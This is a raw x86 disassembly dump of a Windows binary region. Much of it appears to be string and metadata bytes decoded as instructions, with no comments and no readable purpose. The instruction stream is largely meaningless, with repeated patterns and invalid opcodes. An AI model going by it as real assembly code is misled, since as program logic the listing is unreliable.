  40bcc6:	add    BYTE PTR [ebp+0x53],al
  40bcc9:	add    BYTE PTR [ebp+0x0],dh
  40bccc:	jo     0x40bcce
  40bcce:	add    BYTE PTR gs:[edx+0x0],dh
  40bcd2:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  40bcd7:	add    BYTE PTR [edi+0x0],ch
  40bcda:	jne    0x40bcdc
  40bcdc:	jae    0x40bcde
  40bcde:	inc    ebx
  40bcdf:	add    BYTE PTR [edi+0x0],ch
  40bce2:	ins    DWORD PTR es:[edi],dx
  40bce3:	add    BYTE PTR [ebp+0x0],ch
  40bce6:	popa   
  40bce7:	add    BYTE PTR [esi+0x0],ch
  40bcea:	add    BYTE PTR fs:[eax+0x0],dl
  40bcee:	popa   
  40bcef:	add    BYTE PTR [edx+0x0],dh
  40bcf2:	popa   
  40bcf3:	add    BYTE PTR [ebp+0x0],ch
  40bcf6:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40bcfb:	add    BYTE PTR [edx+0x0],dh
  40bcfe:	dec    ecx
  40bcff:	add    BYTE PTR [edi+0x0],ah
  40bd02:	outs   dx,BYTE PTR ds:[esi]
  40bd03:	add    BYTE PTR [edi+0x0],ch
  40bd06:	jb     0x40bd08
  40bd08:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40bd0d:	inc    edi
  40bd0e:	push   ebx
  40bd0f:	add    BYTE PTR [ebp+0x0],dh
  40bd12:	jo     0x40bd14
  40bd14:	add    BYTE PTR gs:[edx+0x0],dh
  40bd18:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  40bd1d:	add    BYTE PTR [edi+0x0],ch
  40bd20:	jne    0x40bd22
  40bd22:	jae    0x40bd24
  40bd24:	inc    ebx
  40bd25:	add    BYTE PTR [edi+0x0],ch
  40bd28:	ins    DWORD PTR es:[edi],dx
  40bd29:	add    BYTE PTR [ebp+0x0],ch
  40bd2c:	popa   
  40bd2d:	add    BYTE PTR [esi+0x0],ch
  40bd30:	add    BYTE PTR fs:[eax+0x0],dl
  40bd34:	popa   
  40bd35:	add    BYTE PTR [edx+0x0],dh
  40bd38:	popa   
  40bd39:	add    BYTE PTR [ebp+0x0],ch
  40bd3c:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  40bd41:	add    BYTE PTR [edx+0x0],dh
  40bd44:	jae    0x40bd46
  40bd46:	dec    ecx
  40bd47:	add    BYTE PTR [edi+0x0],ah
  40bd4a:	outs   dx,BYTE PTR ds:[esi]
  40bd4b:	add    BYTE PTR [edi+0x0],ch
  40bd4e:	jb     0x40bd50
  40bd50:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40bd55:	aas    
  40bd56:	push   ebx
  40bd57:	add    BYTE PTR [ebp+0x0],dh
  40bd5a:	jo     0x40bd5c
  40bd5c:	add    BYTE PTR gs:[edx+0x0],dh
  40bd60:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  40bd65:	add    BYTE PTR [edi+0x0],ch
  40bd68:	jne    0x40bd6a
  40bd6a:	jae    0x40bd6c
  40bd6c:	inc    ebx
  40bd6d:	add    BYTE PTR [edi+0x0],ch
  40bd70:	ins    DWORD PTR es:[edi],dx
  40bd71:	add    BYTE PTR [ebp+0x0],ch
  40bd74:	popa   
  40bd75:	add    BYTE PTR [esi+0x0],ch
  40bd78:	add    BYTE PTR fs:[ebx+0x0],dl
  40bd7c:	ja     0x40bd7e
  40bd7e:	imul   eax,DWORD PTR [eax],0x630074
  40bd84:	push   0x67004900
  40bd89:	add    BYTE PTR [esi+0x0],ch
  40bd8c:	outs   dx,DWORD PTR ds:[esi]
  40bd8d:	add    BYTE PTR [edx+0x0],dh
  40bd90:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40bd95:	push   ebx
  40bd96:	push   ebx
  40bd97:	add    BYTE PTR [ebp+0x0],dh
  40bd9a:	jo     0x40bd9c
  40bd9c:	add    BYTE PTR gs:[edx+0x0],dh
  40bda0:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  40bda5:	add    BYTE PTR [edi+0x0],ch
  40bda8:	jne    0x40bdaa
  40bdaa:	jae    0x40bdac
  40bdac:	inc    ebx
  40bdad:	add    BYTE PTR [edi+0x0],ch
  40bdb0:	ins    DWORD PTR es:[edi],dx
  40bdb1:	add    BYTE PTR [ebp+0x0],ch
  40bdb4:	popa   
  40bdb5:	add    BYTE PTR [esi+0x0],ch
  40bdb8:	add    BYTE PTR fs:[ebx+0x0],dl
  40bdbc:	ja     0x40bdbe
  40bdbe:	imul   eax,DWORD PTR [eax],0x630074
  40bdc4:	push   0x67004900
  40bdc9:	add    BYTE PTR [esi+0x0],ch
  40bdcc:	outs   dx,DWORD PTR ds:[esi]
  40bdcd:	add    BYTE PTR [edx+0x0],dh
  40bdd0:	add    BYTE PTR gs:[eax+eax*1+0x57],ah
  40bdd5:	add    BYTE PTR [ecx+0x0],ch
  40bdd8:	je     0x40bdda
  40bdda:	push   0x6f004400
  40bddf:	add    BYTE PTR [ebp+0x0],ch
  40bde2:	popa   
  40bde3:	add    BYTE PTR [ecx+0x0],ch
  40bde6:	outs   dx,BYTE PTR ds:[esi]
  40bde7:	add    BYTE PTR [eax],al
  40bde9:	xor    DWORD PTR [ebx+0x0],edx
  40bdec:	jne    0x40bdee
  40bdee:	jo     0x40bdf0
  40bdf0:	add    BYTE PTR gs:[edx+0x0],dh
  40bdf4:	data16 add BYTE PTR [eax+eax*1+0x75],ch
  40bdf9:	add    BYTE PTR [edi+0x0],ch
  40bdfc:	jne    0x40bdfe
  40bdfe:	jae    0x40be00
  40be00:	push   ebx
  40be01:	add    BYTE PTR [edi+0x0],dh
  40be04:	imul   eax,DWORD PTR [eax],0x630074
  40be0a:	push   0x67004900
  40be0f:	add    BYTE PTR [esi+0x0],ch
  40be12:	outs   dx,DWORD PTR ds:[esi]
  40be13:	add    BYTE PTR [edx+0x0],dh
  40be16:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40be1b:	pop    ds
  40be1c:	push   esp
  40be1d:	add    BYTE PTR [ecx+0x0],ah
  40be20:	jb     0x40be22
  40be22:	add    BYTE PTR [di+0x0],ah
  40be26:	je     0x40be28
  40be28:	push   esp
  40be29:	add    BYTE PTR [esi+0x0],al
  40be2c:	push   ebx
  40be2d:	add    BYTE PTR [eax+eax*1+0x6f],al
  40be31:	add    BYTE PTR [ebp+0x0],ch
  40be34:	popa   
  40be35:	add    BYTE PTR [ecx+0x0],ch
  40be38:	outs   dx,BYTE PTR ds:[esi]
  40be39:	add    BYTE PTR [eax],al
  40be3b:	andnps xmm0,XMMWORD PTR [eax]
  40be3e:	outs   dx,BYTE PTR ds:[esi]
  40be3f:	add    BYTE PTR [ebx+0x0],ch
  40be42:	outs   dx,BYTE PTR ds:[esi]
  40be43:	add    BYTE PTR [edi+0x0],ch
  40be46:	ja     0x40be48
  40be48:	outs   dx,BYTE PTR ds:[esi]
  40be49:	add    BYTE PTR [eax],al
  40be4b:	inc    ebx
  40be4c:	push   ebp
  40be4d:	add    BYTE PTR [ebx+0x0],dh
  40be50:	imul   eax,DWORD PTR [eax],0x67006e
  40be56:	inc    ecx
  40be57:	add    BYTE PTR [ebp+0x0],dh
  40be5a:	je     0x40be5c
  40be5c:	push   0x72006f00
  40be61:	add    BYTE PTR [ecx+0x0],ch
  40be64:	jp     0x40be66
  40be66:	popa   
  40be67:	add    BYTE PTR [eax+eax*1+0x69],dh
  40be6b:	add    BYTE PTR [edi+0x0],ch
  40be6e:	outs   dx,BYTE PTR ds:[esi]
  40be6f:	add    BYTE PTR [edx+0x0],al
  40be72:	add    BYTE PTR gs:[ebx+0x0],ah
  40be76:	popa   
  40be77:	add    BYTE PTR [ebp+0x0],dh
  40be7a:	jae    0x40be7c
  40be7c:	add    BYTE PTR gs:[edi+0x0],cl
  40be80:	data16 add BYTE PTR [esi+0x0],al
  40be84:	outs   dx,DWORD PTR ds:[esi]
  40be85:	add    BYTE PTR [edx+0x0],dh
  40be88:	ins    DWORD PTR es:[edi],dx
  40be89:	add    BYTE PTR [ecx+0x0],ah
  40be8c:	je     0x40be8e
  40be8e:	add    BYTE PTR [ebx],dl
  40be90:	push   esi
  40be91:	add    BYTE PTR [ebp+0x0],ah
  40be94:	jb     0x40be96
  40be96:	imul   eax,DWORD PTR [eax],0x790066
  40be9c:	imul   eax,DWORD PTR [eax],0x67006e
  40bea2:	add    BYTE PTR [edi],cl
  40bea4:	push   edi
  40bea5:	add    BYTE PTR [ecx+0x0],ah
  40bea8:	jb     0x40beaa
  40beaa:	outs   dx,BYTE PTR ds:[esi]
  40beab:	add    BYTE PTR [ecx+0x0],ch
  40beae:	outs   dx,BYTE PTR ds:[esi]
  40beaf:	add    BYTE PTR [edi+0x0],ah
  40beb2:	add    BYTE PTR [ecx],bl
  40beb4:	push   edi
  40beb5:	add    BYTE PTR [ecx+0x0],ch
  40beb8:	outs   dx,BYTE PTR ds:[esi]
  40beb9:	add    BYTE PTR [eax+eax*1+0x6f],ah
  40bebd:	add    BYTE PTR [edi+0x0],dh
  40bec0:	jae    0x40bec2
  40bec2:	inc    edi
  40bec3:	add    BYTE PTR [edx+0x0],dh
  40bec6:	outs   dx,DWORD PTR ds:[esi]
  40bec7:	add    BYTE PTR [ebp+0x0],dh
  40beca:	jo     0x40becc
  40becc:	add    BYTE PTR [edi],dl
  40bece:	push   edi
  40becf:	add    BYTE PTR [ecx+0x0],ch
  40bed2:	outs   dx,BYTE PTR ds:[esi]
  40bed3:	add    BYTE PTR [eax+eax*1+0x6f],ah
  40bed7:	add    BYTE PTR [edi+0x0],dh
  40beda:	jae    0x40bedc
  40bedc:	push   ebp
  40bedd:	add    BYTE PTR [ebx+0x0],dh
  40bee0:	add    BYTE PTR gs:[edx+0x0],dh
  40bee4:	add    BYTE PTR [eax],al
  40bee6:	add    BYTE PTR [eax],al
  40bee8:	outs   dx,DWORD PTR ds:[esi]
  40bee9:	sahf   
  40beea:	ret    0x5f97
  40beed:	and    DWORD PTR [edi],edx
  40beef:	inc    esi
  40bef0:	mov    esi,0x511bdeb2
  40bef5:	inc    edi
  40bef6:	sub    DWORD PTR ds:0x7ab70800,0x5c
  40befd:	push   esi
  40befe:	sbb    DWORD PTR [eax+eiz*8],esi
  40bf01:	mov    DWORD PTR [edx],eax
  40bf03:	push   es
  40bf04:	push   cs
  40bf05:	or     al,0x53
  40bf07:	add    BYTE PTR [ebp+0x0],al
  40bf0a:	push   edx
  40bf0b:	add    BYTE PTR [esi+0x0],dl
  40bf0e:	inc    ebp
  40bf0f:	add    BYTE PTR [edx+0x0],dl
  40bf12:	push   ss
  40bf13:	arpl   WORD PTR [eax],ax
  40bf15:	outs   dx,DWORD PTR ds:[esi]
  40bf16:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40bf1a:	add    BYTE PTR [ebp+0x0],ah
  40bf1d:	arpl   WORD PTR [eax],ax
  40bf1f:	je     0x40bf21
  40bf21:	imul   eax,DWORD PTR [eax],0x6e006f
  40bf27:	cmp    al,BYTE PTR [eax]
  40bf29:	push   cs
  40bf2a:	jae    0x40bf2c
  40bf2c:	add    BYTE PTR gs:[edx+0x0],dh
  40bf30:	jbe    0x40bf32
  40bf32:	add    BYTE PTR gs:[edx+0x0],dh
  40bf36:	cmp    al,BYTE PTR [eax]
  40bf38:	sbb    al,0x63
  40bf3a:	add    BYTE PTR [edi+0x0],ch
  40bf3d:	ins    BYTE PTR es:[edi],dx
  40bf3e:	add    BYTE PTR [eax+eax*1+0x65],ch
  40bf42:	add    BYTE PTR [ebx+0x0],ah
  40bf45:	je     0x40bf47
  40bf47:	imul   eax,DWORD PTR [eax],0x6e006f
  40bf4d:	add    BYTE PTR gs:[esi+0x0],ch
  40bf51:	jbe    0x40bf53
  40bf53:	cmp    al,BYTE PTR [eax]
  40bf55:	adc    al,0x73
  40bf57:	add    BYTE PTR [ebp+0x0],ah
  40bf5a:	jb     0x40bf5c
  40bf5c:	jbe    0x40bf5e
  40bf5e:	add    BYTE PTR gs:[edx+0x0],dh
  40bf62:	add    BYTE PTR gs:[esi+0x0],ch
  40bf66:	jbe    0x40bf68
  40bf68:	cmp    al,BYTE PTR [eax]
  40bf6a:	add    eax,DWORD PTR [eax]
  40bf6c:	add    BYTE PTR [ecx],al
  40bf6e:	or     BYTE PTR [eax+0x117f5f3f],dh
  40bf74:	aad    0xa
  40bf76:	cmp    al,BYTE PTR ds:0x12010100
  40bf7c:	or     DWORD PTR [edi],eax
  40bf7e:	add    BYTE PTR [edx],al
  40bf80:	add    DWORD PTR [edx],edx
  40bf82:	or     eax,0x81112
  40bf87:	add    eax,DWORD PTR [ecx]
  40bf89:	adc    cl,BYTE PTR ds:0x415120e
  40bf8f:	add    BYTE PTR [ecx],al
  40bf91:	add    DWORD PTR [esi],ecx
  40bf93:	or     DWORD PTR [eax],eax
  40bf95:	add    edx,DWORD PTR [edx]
  40bf97:	or     DWORD PTR [esi],ecx
  40bf99:	adc    DWORD PTR [ecx],ebx
  40bf9b:	adc    DWORD PTR ds:0x1204000a,ebx
  40bfa1:	or     DWORD PTR [esi],ecx
  40bfa3:	adc    DWORD PTR [ecx],ebx
  40bfa5:	adc    DWORD PTR ds:0x2000802,ebx
  40bfab:	adc    cl,BYTE PTR [ecx]
  40bfad:	adc    ah,BYTE PTR [ecx]
  40bfaf:	adc    DWORD PTR [ecx],ebx
  40bfb1:	add    eax,0x1d080100
  40bfb6:	push   cs
  40bfb7:	adc    al,BYTE PTR [eax]
  40bfb9:	pop    es
  40bfba:	add    cl,BYTE PTR [eax]
  40bfbc:	sbb    eax,0x2512100e
  40bfc1:	adc    BYTE PTR [esi],cl
  40bfc3:	adc    BYTE PTR [edx],dl
  40bfc5:	or     DWORD PTR [eax],edx
  40bfc7:	or     BYTE PTR [eax],dl
  40bfc9:	or     BYTE PTR [ecx],cl
  40bfcb:	add    BYTE PTR [ebx],al
  40bfcd:	add    cl,BYTE PTR [eax]
  40bfcf:	sbb    eax,0x2512100e
  40bfd4:	add    eax,0x1d010100
  40bfd9:	push   cs
  40bfda:	add    eax,0x12010100
  40bfdf:	sub    DWORD PTR [edi],eax
  40bfe1:	add    BYTE PTR [edx],al
  40bfe3:	add    DWORD PTR ds:0x50e2912,ebx
  40bfe9:	add    BYTE PTR [ecx],al
  40bfeb:	add    DWORD PTR [edx],edx
  40bfed:	sub    eax,0x31120603
  40bff2:	add    eax,DWORD PTR [esi]
  40bff4:	adc    dh,BYTE PTR ds:0x39120603
  40bffa:	add    eax,DWORD PTR [esi]
  40bffc:	adc    ch,BYTE PTR ds:0x12150608
  40c002:	cmp    eax,0x25120e02
  40c007:	add    esp,DWORD PTR [eax]
  40c009:	add    BYTE PTR [ecx],al
  40c00b:	add    eax,DWORD PTR [esi]
  40c00d:	adc    al,BYTE PTR [ecx+0x3]
  40c010:	push   es
  40c011:	adc    al,BYTE PTR [ebp+0x4]
  40c014:	add    BYTE PTR [eax],al
  40c016:	adc    al,BYTE PTR [ecx+0x4]
  40c019:	add    BYTE PTR [eax],al
  40c01b:	adc    al,BYTE PTR [ebp+0x5]
  40c01e:	add    BYTE PTR [ecx],al
  40c020:	add    DWORD PTR [edx],edx
  40c022:	inc    ebp
  40c023:	add    eax,DWORD PTR [eax]
  40c025:	add    BYTE PTR [esi],cl
  40c027:	add    al,0x8
  40c029:	add    BYTE PTR [edx],dl
  40c02b:	inc    ecx
  40c02c:	add    al,0x8
  40c02e:	add    BYTE PTR [edx],dl
  40c030:	inc    ebp
  40c031:	add    ecx,DWORD PTR [eax]
  40c033:	add    BYTE PTR [esi],cl
  40c035:	add    al,0x20
  40c037:	add    DWORD PTR [ecx],eax
  40c039:	push   cs
  40c03a:	add    al,0x20
  40c03c:	add    DWORD PTR [ecx],eax
  40c03e:	add    al,BYTE PTR ds:0xe010220
  40c044:	push   cs
  40c045:	push   es
  40c046:	and    BYTE PTR [ecx],al
  40c048:	add    DWORD PTR [ecx],edx
  40c04a:	sbb    BYTE PTR [ecx+0x1012006],0x11
  40c051:	and    BYTE PTR [ecx+0x1012004],0x8
  40c058:	and    BYTE PTR [eax+0x2400],0x4
  40c05f:	add    BYTE PTR [eax],0x0
  40c062:	xchg   esp,eax
  40c063:	add    BYTE PTR [eax],al
  40c065:	add    BYTE PTR [esi],al
  40c067:	add    al,BYTE PTR [eax]
  40c069:	add    BYTE PTR [eax],al
  40c06b:	and    al,0x0
  40c06d:	add    BYTE PTR [edx+0x53],dl
  40c070:	inc    ecx
  40c071:	xor    DWORD PTR [eax],eax
  40c073:	add    al,0x0
  40c075:	add    BYTE PTR [ecx],al
  40c077:	add    BYTE PTR [ecx],al
  40c079:	add    BYTE PTR [edi],al
  40c07b:	sar    edx,1
  40c07d:	push   edi
  40c07e:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  40c084:	test   BYTE PTR [edx+0xdfdae0f],ch
  40c08a:	jmp    0xecabbe77
  40c08f:	pop    DWORD PTR [edi+0x6c7603fb]
  40c095:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  40c09a:	mov    dl,0x3b
  40c09c:	out    0x9a,eax
  40c09e:	(bad)  
  40c0a0:	fadd   st(1),st
  40c0a2:	fstp   QWORD PTR [edx+0x211336d2]
  40c0a8:	add    dl,BYTE PTR [eax-0x6c38df5]
  40c0ae:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  40c0b5:	pop    esi
  40c0b7:	pop    es
  40c0b8:	ja     0x40c109
  40c0ba:	sub    eax,ebp
  40c0bc:	xor    cl,BYTE PTR [esi]
  40c0be:	xchg   edx,eax
  40c0bf:	jmp    0xc021:0xe8e4ec05
  40c0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0c7:	out    dx,eax
  40c0c8:	call   0x4c9d25be
  40c0cd:	or     al,0x93
  40c0cf:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  40c0d6:	stos   BYTE PTR es:[edi],al
  40c0d7:	gs sub al,0x1d
  40c0da:	cli    
  40c0db:	(bad)  
  40c0dc:	cmp    eax,0x2d6f5d74
  40c0e1:	in     eax,0xf1
  40c0e3:	jle    0x40c143
  40c0e5:	scas   eax,DWORD PTR es:[edi]
  40c0e6:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  40c0ee:	inc    ebx
  40c0ef:	sbb    BYTE PTR gs:[eax],ah
  40c0f2:	ins    DWORD PTR es:[edi],dx
  40c0f3:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  40c0fa:	add    al,0x20
  40c0fc:	add    BYTE PTR [edx],dl
  40c0fe:	and    DWORD PTR [ebx],eax
  40c100:	and    BYTE PTR [eax],al
  40c102:	push   cs
  40c103:	add    eax,0xe0e0220
  40c108:	push   cs
  40c109:	add    esp,DWORD PTR [eax]
  40c10b:	add    BYTE PTR [edx],al
  40c10d:	pop    es
  40c10e:	add    BYTE PTR [edx],al
  40c110:	adc    DWORD PTR [eax+0x7020eb9],eax
  40c116:	add    BYTE PTR [ecx],al
  40c118:	adc    DWORD PTR [eax+0x40912c1],eax
  40c11e:	add    BYTE PTR [ecx],al
  40c120:	add    DWORD PTR [eax+ecx*1],ebx
  40c123:	add    BYTE PTR [ebx],al
  40c125:	add    cl,BYTE PTR [esi]
  40c127:	push   cs
  40c128:	adc    DWORD PTR [eax+0x10004c9],eax
  40c12e:	add    cl,BYTE PTR [esi]
  40c130:	add    eax,0x120e0100
  40c135:	or     DWORD PTR [ebx],eax
  40c137:	and    BYTE PTR [eax],al
  40c139:	or     BYTE PTR ds:0x121d0020,al
  40c13f:	and    DWORD PTR ds:0x80120000,eax
  40c145:	int    0x6
  40c147:	and    BYTE PTR [ecx],al
  40c149:	push   cs
  40c14a:	adc    al,BYTE PTR [eax+0x30009d5]
  40c150:	push   cs
  40c151:	adc    al,BYTE PTR [eax+0x1c1d0ed5]
  40c157:	or     al,0x20
  40c159:	add    ebx,DWORD PTR ds:0x121d0912
  40c15f:	and    DWORD PTR [ecx],edx
  40c161:	sbb    DWORD PTR [ecx],edx
  40c163:	sbb    eax,0x11130727
  40c168:	cmp    BYTE PTR [ecx+0xec58011],0xe
  40c16f:	push   cs
  40c170:	push   cs
  40c171:	sbb    eax,0x9120912
  40c176:	sbb    eax,0x9120912
  40c17b:	adc    DWORD PTR [eax+0x81c1db9],eax
  40c181:	sbb    eax,0x1d080912
  40c186:	sbb    al,0x8
  40c188:	sbb    eax,0x5080912
  40c18d:	add    BYTE PTR [eax],al
  40c18f:	adc    al,BYTE PTR [eax+0x22005d9]
  40c195:	add    cl,BYTE PTR [esi]
  40c197:	push   cs
  40c198:	add    eax,0xe020200
  40c19d:	push   cs
  40c19e:	add    eax,0x1d0e0100
  40c1a3:	sbb    al,0x10
  40c1a5:	pop    es
  40c1a6:	add    eax,0x11b98011
  40c1ab:	add    ch,0x11
  40c1ae:	cmp    BYTE PTR [ecx+0x1dc58011],0x1c
  40c1b5:	or     ah,BYTE PTR [eax]
  40c1b7:	add    edx,DWORD PTR [edx]
  40c1b9:	or     DWORD PTR [edx],edx
  40c1bb:	and    DWORD PTR [ecx],edx
  40c1bd:	sbb    DWORD PTR [ecx],edx
  40c1bf:	sbb    eax,0x1500200a
  40c1c4:	adc    al,BYTE PTR [eax-0x7fedfe1b]
  40c1ca:	jmp    0x8052d6d7
  40c1cf:	in     eax,dx
  40c1d0:	add    DWORD PTR [edx],edx
  40c1d2:	sub    cl,0x9
  40c1d5:	and    BYTE PTR [eax],al
  40c1d7:	adc    eax,0x1f18012
  40c1dc:	adc    eax,DWORD PTR [eax]
  40c1de:	or     BYTE PTR ds:0x1f18012,dl
  40c1e4:	adc    al,BYTE PTR [eax+0x2004e9]
  40c1ea:	adc    eax,DWORD PTR [eax]
  40c1ec:	add    al,0x20
  40c1ee:	add    DWORD PTR [esi],ecx
  40c1f0:	or     BYTE PTR ds:0x80e0220,al
  40c1f6:	or     BYTE PTR ds:0xe0e0200,al
  40c1fc:	push   cs
  40c1fd:	adc    al,BYTE PTR [edi]
  40c1ff:	push   es
  40c200:	adc    cl,BYTE PTR [ecx]
  40c202:	adc    al,BYTE PTR [eax+0xe0202e9]
  40c208:	adc    eax,0x1f18012
  40c20d:	adc    al,BYTE PTR [eax+0x2009e9]
  40c213:	adc    eax,0x1fd8012
  40c218:	adc    dl,BYTE PTR [ecx]
  40c21a:	pop    es
  40c21b:	adc    eax,0x1018112
  40c220:	adc    dl,BYTE PTR [ecx]
  40c222:	pop    es
  40c223:	adc    eax,0x1f18012
  40c228:	adc    dl,BYTE PTR [ecx]
  40c22a:	or     eax,0x11120307
  40c22f:	sbb    eax,0x8012151c
  40c234:	icebp  
  40c235:	add    DWORD PTR [edx],edx
  40c237:	adc    DWORD PTR [edi+eax*1],eax
  40c23a:	add    DWORD PTR ds:0x120051c,ebx
  40c240:	push   cs
  40c241:	adc    al,BYTE PTR [ebp+0x5]
  40c244:	add    BYTE PTR [ecx],al
  40c246:	adc    ah,BYTE PTR [ecx]
  40c248:	push   cs
  40c249:	or     al,0x20
  40c24b:	add    al,0x12
  40c24d:	or     DWORD PTR [ecx],edx
  40c24f:	add    DWORD PTR ds:0x1119110e,0x1206031d
  40c259:	and    DWORD PTR [ecx],ecx
  40c25b:	pop    es
  40c25c:	add    edx,DWORD PTR [edx]
  40c25e:	or     DWORD PTR [ecx],edx
  40c260:	cmp    BYTE PTR [ecx+0x41c1d],0x1
  40c267:	add    DWORD PTR [eax],ecx
  40c269:	add    eax,0x12080207
  40c26e:	or     DWORD PTR [ecx+eax*1],eax
  40c271:	add    BYTE PTR [eax],al
  40c273:	add    BYTE PTR ds:0x81120000,al
  40c279:	adc    DWORD PTR [eax+eiz*1],eax
  40c27c:	add    BYTE PTR [edx],dl
  40c27e:	inc    ebp
  40c27f:	add    eax,0x12010120
  40c284:	inc    ebp
  40c285:	add    eax,0x81120000
  40c28a:	sbb    DWORD PTR ds:0x81120020,eax
  40c290:	sbb    eax,0x14110603
  40c295:	or     DWORD PTR [eax],eax
  40c297:	add    al,BYTE PTR [ecx]
  40c299:	adc    al,BYTE PTR [ecx+0x3181112d]
  40c29f:	add    al,0x20
  40c2a1:	add    DWORD PTR [eax],ecx
  40c2a3:	sbb    al,0x4
  40c2a5:	add    BYTE PTR [ecx],al
  40c2a7:	push   cs
  40c2a8:	push   cs
  40c2a9:	push   es
  40c2aa:	and    BYTE PTR [ecx],al
  40c2ac:	sbb    eax,0x4031d0e
  40c2b1:	and    BYTE PTR [ecx],al
  40c2b3:	add    ecx,DWORD PTR [eax]
  40c2b5:	add    eax,0x1c0e0200
  40c2ba:	sbb    al,0x7
  40c2bc:	and    BYTE PTR [edx],al
  40c2be:	add    cl,BYTE PTR [esi]
  40c2c0:	adc    DWORD PTR [eax+0x2005c9],eax
  40c2c6:	adc    al,BYTE PTR [eax+0x2003f5]
  40c2cc:	sbb    al,0x6
  40c2ce:	add    BYTE PTR [ecx],al
  40c2d0:	adc    al,BYTE PTR [ecx+0x80e45]
  40c2d6:	add    DWORD PTR [edx],edx
  40c2d8:	add    DWORD PTR [ecx+0x12],0x84581
  40c2df:	add    DWORD PTR [edx],edx
  40c2e1:	or     DWORD PTR [ebp+0x12],0x20064581
  40c2e8:	add    DWORD PTR [ecx],eax
  40c2ea:	adc    al,BYTE PTR [ecx+0x20052d]
  40c2f0:	adc    al,BYTE PTR [ecx+0x15060745]
  40c2f6:	adc    bh,BYTE PTR ds:0x6080e02
  40c2fc:	adc    eax,0xe023d12
  40c301:	or     BYTE PTR [edi],al
  40c303:	and    BYTE PTR [edx],al
  40c305:	add    DWORD PTR [ebx],edx
  40c307:	add    BYTE PTR [ebx],dl
  40c309:	add    DWORD PTR [eax],ecx
  40c30b:	and    BYTE PTR [edx],al
  40c30d:	add    dl,BYTE PTR [ebx]
  40c30f:	add    BYTE PTR [eax],dl
  40c311:	adc    eax,DWORD PTR [ecx]
  40c313:	pop    es
  40c314:	and    BYTE PTR [ebx],al
  40c316:	adc    ah,BYTE PTR [ecx]
  40c318:	push   cs
  40c319:	push   cs
  40c31a:	push   cs
  40c31b:	or     BYTE PTR [eax],ah
  40c31d:	add    bl,BYTE PTR ds:0x110e0912
  40c323:	sbb    eax,0x12000005
  40c328:	adc    DWORD PTR [ebp+0x9],0x12010320
  40c32f:	and    DWORD PTR [ecx],edx
  40c331:	sbb    DWORD PTR [ecx+0xe],0x1012005
  40c338:	adc    ah,BYTE PTR [ecx]
  40c33a:	pop    es
  40c33b:	and    BYTE PTR [edx],al
  40c33d:	add    DWORD PTR [edx],edx
  40c33f:	and    DWORD PTR [edx],edx
  40c341:	and    DWORD PTR [edi],eax
  40c343:	and    BYTE PTR [edx],al
  40c345:	add    dl,BYTE PTR [edx]
  40c347:	and    DWORD PTR [edx],edx
  40c349:	and    DWORD PTR [edx],ecx
  40c34b:	and    BYTE PTR ds:0x120e1112,al
  40c351:	and    DWORD PTR [eax],ecx
  40c353:	or     BYTE PTR [edx],al
  40c355:	or     eax,0x15120320
  40c35a:	push   cs
  40c35b:	adc    eax,0x1fd8012
  40c360:	adc    ah,BYTE PTR [ecx]
  40c362:	add    al,BYTE PTR [eax+eiz*1]
  40c365:	add    BYTE PTR [edx],dl
  40c367:	or     eax,0x12012006
  40c36c:	adc    DWORD PTR [edx],edx
  40c36e:	and    DWORD PTR [edi],eax
  40c370:	and    BYTE PTR [edx],al
  40c372:	adc    dl,BYTE PTR [ecx]
  40c374:	adc    ah,BYTE PTR [ecx]
  40c376:	or     BYTE PTR ds:0x12010120,al
  40c37c:	adc    eax,0x1020005
  40c381:	push   cs
  40c382:	sbb    al,0x7
  40c384:	adc    eax,0xe023d12
  40c389:	adc    ah,BYTE PTR ds:0x1500200b
  40c38f:	adc    al,BYTE PTR [ecx+0x13025d]
  40c395:	adc    eax,DWORD PTR [ecx]
  40c397:	or     BYTE PTR ds:0x25d8112,dl
  40c39d:	push   cs
  40c39e:	adc    ah,BYTE PTR ds:0x1500200b
  40c3a4:	adc    DWORD PTR [ecx+0x130261],eax
  40c3aa:	adc    eax,DWORD PTR [ecx]
  40c3ac:	or     BYTE PTR ds:0x2618111,dl
  40c3b2:	push   cs
  40c3b3:	adc    ah,BYTE PTR ds:0x12002005
  40c3b9:	or     DWORD PTR ds:0x45078980,0x1d0e1d08
  40c3c3:	or     BYTE PTR ds:0x12091208,bl
  40c3c9:	or     DWORD PTR [edx],edx
  40c3cb:	sub    eax,0x39811208
  40c3d0:	adc    al,BYTE PTR [ecx+0x39811239]
  40c3d6:	push   cs
  40c3d7:	push   cs
  40c3d8:	push   cs
  40c3d9:	push   cs
  40c3da:	sbb    al,0xe
  40c3dc:	push   cs
  40c3dd:	push   cs
  40c3de:	push   cs
  40c3df:	push   cs
  40c3e0:	or     BYTE PTR [eax+ecx*1],bl
  40c3e3:	sbb    eax,0x8112080e
  40c3e8:	or     eax,0x21122112
  40c3ed:	adc    cl,BYTE PTR [ecx]
  40c3ef:	adc    DWORD PTR [eax-0x467fee47],eax
  40c3f5:	adc    DWORD PTR [eax-0x467fee47],eax
  40c3fb:	adc    DWORD PTR [eax+0x251202b9],eax
  40c401:	push   cs
  40c402:	adc    cl,BYTE PTR [ecx]
  40c404:	or     BYTE PTR [eax],cl
  40c406:	adc    dl,BYTE PTR ds:0x120e2512
  40c40c:	or     DWORD PTR [eax],ecx
  40c40e:	or     BYTE PTR [edx],dl
  40c410:	adc    eax,0x25121112
  40c415:	adc    ah,BYTE PTR ds:0xee98012
  40c41b:	adc    al,BYTE PTR [ecx+0xe1d080d]
  40c421:	sbb    eax,0x31d080e
  40c426:	sbb    eax,0x1c1d080e
  40c42b:	adc    al,BYTE PTR [eax-0x67fed0b]
  40c431:	push   cs
